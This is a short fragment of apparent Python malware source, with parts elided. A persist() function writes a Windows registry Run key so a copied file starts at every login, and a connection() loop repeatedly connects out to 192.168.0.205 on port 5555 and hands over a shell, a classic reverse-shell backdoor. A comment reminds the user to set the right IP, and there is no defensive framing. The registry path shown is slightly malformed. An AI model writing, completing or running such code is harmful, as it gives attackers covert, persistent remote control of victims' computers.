...
def persist(reg_name, copy_name):
    ...
    try:
        if not os.path.exists(file_location):
            ...
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\Current\Version\Run /v ' + reg_name + ' /t REG_SZ /d  "' + file_location + '"', shell=True)
...
def connection():
    while True:
        time.sleep(20)
        try:
            s.connect(('192.168.0.205', 5555)) # Remember to use right IP
            shell()
            s.close()
            break
        except:
